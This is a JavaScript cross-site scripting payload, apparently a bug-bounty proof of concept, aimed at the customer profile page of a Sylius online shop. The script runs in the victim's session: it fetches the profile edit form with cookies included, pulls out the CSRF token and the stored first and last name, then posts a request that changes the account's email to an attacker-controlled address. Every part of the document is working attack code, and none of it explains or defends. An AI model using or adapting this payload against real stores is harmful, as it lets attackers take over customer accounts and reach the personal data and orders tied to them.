(async () => {
    const MAILBOX = 'fqdn';
    const DOMAIN = 'wearehackerone.com';
    const DEBUG = true;

    const uniqueTag = async () => {
        try {
            const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(String(Date.now())));
            return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, '0')).join('').slice(0, 12);
        } catch {
            return Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
        }
    };

    const ATTACKER_EMAIL = `${MAILBOX}+${await uniqueTag()}@${DOMAIN}`;
    const ACCT = '/' + (location.pathname.split('/')[1] || 'en_GB');
    const url = ACCT + '/account/profile/edit';

    const res = await fetch(url, { credentials: 'include' });
    const html = await res.text();
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const form = [...doc.querySelectorAll('form')].find((f) =>
        f.querySelector('[name="sylius_customer_profile[_token]"]'),
    );
    const grab = (name) => form?.querySelector(`[name="sylius_customer_profile[${name}]"]`)?.value ?? '';

    if (DEBUG) {
        console.log('[xss] email=' + ATTACKER_EMAIL);
        console.log('[xss] status=' + res.status + ' redirected=' + res.redirected + ' finalUrl=' + res.url);
        console.log('[xss] formFound=' + !!form + ' token=' + grab('_token').slice(0, 12) + ' firstName=' + grab('firstName'));
    }
    if (!form) return;

    const r = await fetch(url, {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
            _method: 'PUT',
            'sylius_customer_profile[email]': ATTACKER_EMAIL,
            'sylius_customer_profile[firstName]': grab('firstName'),
            'sylius_customer_profile[lastName]': grab('lastName'),
            'sylius_customer_profile[_token]': grab('_token'),
        }),
    });
    if (DEBUG) console.log('[xss] post status=' + r.status + ' finalUrl=' + r.url);
})();
